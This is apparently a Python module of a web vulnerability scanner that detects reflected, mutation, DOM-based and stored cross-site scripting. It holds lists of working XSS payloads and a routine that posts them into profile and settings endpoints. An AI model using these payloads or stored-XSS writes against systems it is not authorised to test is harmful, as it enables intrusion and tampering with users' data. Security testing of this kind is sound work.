from typing import Optional

import requests

from tools.html_context_parser import probe_and_detect
from tools.http_client import build_url
from tools.log_utils import get_logger
from tools.payload_engine import generate
from tools.response_profiler import ResponseProfiler
from tools.settings import settings

logger = get_logger("xss_detector")

REFLECTION_MARKERS = ["XSS_TEST_%d" % i for i in range(100, 160)]

POLYGLOT_PAYLOADS = [
    '"><svg onload=alert(1)>',
    "'-alert(1)-'",
    '\\";alert(1);//',
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '{{constructor.constructor("alert(1)")()}}',
]

MUTATION_XSS_PAYLOADS = [
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>',
    '<svg><p><style><img src=x onerror=alert(1)>',
    '<select><style></select><img src=x onerror=alert(1)>',
]

DOM_SINK_PATTERNS = [
    "innerHTML",
    "outerHTML",
    "document.write",
    "document.writeln",
    ".insertAdjacentHTML",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "new Function(",
]

STORE_AND_FETCH_PATHS = ["/profile", "/settings", "/api/user/update", "/api/profile"]

CONTEXT_TO_PAYLOAD_KEY = {
    "html": "html",
    "attr_double": "attr",
    "attr_single": "attr",
    "attr_value_unquoted": "attr",
    "script": "js",
    "comment": "html",
    "event_handler": "attr",
    "angular": "angular",
}

XSS_TRIGGER_PATTERNS = ["alert(1)", "onerror=", "onload=", "onfocus=",
                         "ontoggle=", "onmouseover=", "prompt(", "confirm("]

try:
    from tools.xss_browser_verify import check as browser_verify
    HAS_BROWSER_VERIFY = True
except Exception:
    browser_verify = None
    HAS_BROWSER_VERIFY = False


def _payload_reflected_unescaped(html: str, payload: str) -> bool:
    if not payload:
        return False
    if payload not in html:
        return False
    escaped = payload.replace("<", "&lt;").replace(">", "&gt;")
    return escaped not in html


def _has_unescaped_trigger(html: str) -> bool:
    for t in XSS_TRIGGER_PATTERNS:
        if t in html:
            escaped = t.replace("=", "&#x3D;")
            if escaped not in html:
                return True
    return False


def _is_in_html_context(html: str, marker: str, payload: str) -> bool:
    idx = html.find(marker)
    if idx < 0:
        return False
    before = html[max(0, idx - 100):idx]
    html[idx + len(marker) + len(payload):idx + len(marker) + len(payload) + 100]
    in_script = before.lower().rfind('<script') > before.lower().rfind('</script')
    in_html_tag = '<' in before.split('>')[-1] if '>' in before else '<' in before
    if in_script and not in_html_tag:
        return False
    return True


def _check_dom_sink(html: str, payload: str) -> bool:
    idx = html.find(payload)
    if idx < 0:
        return False
    before = html[max(0, idx - 500):idx].lower()
    for sink in DOM_SINK_PATTERNS:
        if sink in before:
            return True
    return False


def _detect_stored_xss(url: str, param: str, sess: requests.Session,
                       timeout: float, payload: str, marker: str) -> bool:
    base = url.rstrip("/")
    test_val = marker + payload
    for store_path in STORE_AND_FETCH_PATHS:
        try:
            sess.post(base + store_path, data={param: test_val}, timeout=timeout)
            r = sess.get(base + store_path, timeout=timeout)
            if marker in r.text and _payload_reflected_unescaped(r.text, payload):
                return True
        except Exception:
            pass
    return False


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0, post_body: bool = False, post_data: dict = None,
          context: str = "all", waf_name: Optional[str] = None) -> dict:
    if sess is None:
        sess = requests.Session()
        sess.verify = settings.verify_ssl
    result = {"vulnerable": False, "type": None, "evidence": [], "confirmed": False,
              "vector": None, "needs_browser_verify": False, "confidence": "low",
              "confidence_score": 0.0, "confidence_votes": []}

    profiler = ResponseProfiler()
    baseline = profiler.profile_endpoint(url, param, sess, timeout)

    detected_ctx = context
    if context == "all":
        detected = probe_and_detect(url, param, sess, timeout, post_body, post_data)
        if detected not in ("not_reflected", "unknown"):
            logger.debug("context probe: %s -> %s", param, detected)
            detected_ctx = detected
            result["evidence"].append("detected_context: %s" % detected)
        else:
            result["evidence"].append("context:not_reflected")

    payload_ctx_key = CONTEXT_TO_PAYLOAD_KEY.get(detected_ctx, "html") if detected_ctx != "all" else None
    contexts_to_try = [payload_ctx_key] if payload_ctx_key else ["html", "attr", "js", "angular"]

    confirmed_count = 0
    total_tried = 0

    for ctx in contexts_to_try:
        seeds = generate("xss", ctx, "all", waf_name)
        for i, entry in enumerate(seeds):
            total_tried += 1
            payload = entry["payload"]
            marker = REFLECTION_MARKERS[i % len(REFLECTION_MARKERS)]
            test_payload = marker + payload
            try:
                if post_body and post_data:
                    d = post_data.copy()
                    d[param] = test_payload
                    r = sess.post(url, data=d, timeout=timeout)
                else:
                    r = sess.get(build_url(url, param, test_payload), timeout=timeout)

                if marker in r.text and _payload_reflected_unescaped(r.text, payload):
                    confirmed_count += 1
                    result["vulnerable"] = True
                    result["type"] = "reflected_%s" % ctx
                    result["vector"] = payload[:80]
                    result["evidence"].append("reflected %s in %s (%dB)" % (ctx, param, len(r.text)))

                    if _has_unescaped_trigger(r.text):
                        result["confirmed"] = True
                        result["evidence"].append("unescaped trigger detected")

                    if baseline:
                        report = profiler.analyze(url, param, r)
                        if report.is_anomalous:
                            result["evidence"].append("response_anomaly: %s" % "; ".join(report.reasons))

                    if confirmed_count >= 2:
                        break
            except Exception as e:
                logger.debug("xss %s payload: %s", ctx, e)

        if confirmed_count >= 2:
            break

    if confirmed_count == 0 and detected_ctx in ("not_reflected", "unknown"):
        for payload in POLYGLOT_PAYLOADS:
            total_tried += 1
            try:
                r = sess.get(build_url(url, param, payload), timeout=timeout)
                if _payload_reflected_unescaped(r.text, payload):
                    confirmed_count += 1
                    result["vulnerable"] = True
                    result["type"] = "polyglot"
                    result["evidence"].append("polyglot reflected: %s" % payload[:30])
                    result["vector"] = payload[:80]
                    if _has_unescaped_trigger(r.text):
                        result["confirmed"] = True
                    break
            except Exception as e:
                logger.debug("xss polyglot: %s", e)

    if result["vulnerable"] and not result["confirmed"]:
        for payload in MUTATION_XSS_PAYLOADS:
            try:
                r = sess.get(build_url(url, param, payload), timeout=timeout)
                if _payload_reflected_unescaped(r.text, payload):
                    result["confirmed"] = True
                    result["type"] = "mutation_xss"
                    result["evidence"].append("mXSS: %s" % payload[:40])
                    break
            except Exception:
                pass

    if result["vulnerable"] and not result["confirmed"]:
        r = sess.get(build_url(url, param, result.get("vector", "xss")), timeout=timeout)
        if _check_dom_sink(r.text, result.get("vector", "")):
            result["confirmed"] = True
            result["evidence"].append("dom_sink_detected")

    if not result["vulnerable"] or not result["confirmed"]:
        for payload in MUTATION_XSS_PAYLOADS + POLYGLOT_PAYLOADS:
            marker = REFLECTION_MARKERS[0]
            if _detect_stored_xss(url, param, sess, timeout, payload, marker):
                result["vulnerable"] = True
                result["confirmed"] = True
                result["type"] = "stored_xss"
                result["evidence"].append("stored_xss: %s" % payload[:40])
                break

    if result["vulnerable"] and not result["confirmed"] and HAS_BROWSER_VERIFY:
        verify_result = browser_verify(url, param, sess, timeout)
        if verify_result.get("confirmed"):
            result["confirmed"] = True
            result["evidence"].extend(verify_result.get("evidence", []))

    vote_score = min(0.9, confirmed_count * 0.3)
    if result.get("confirmed"):
        vote_score = min(1.0, vote_score + 0.3)
    if confirmed_count >= 2:
        vote_score = min(1.0, vote_score + 0.15)
    result["confidence_score"] = round(vote_score, 2)
    if vote_score >= 0.75:
        result["confidence"] = "high"
    elif vote_score >= 0.4:
        result["confidence"] = "medium"
    else:
        result["confidence"] = "low"

    return result
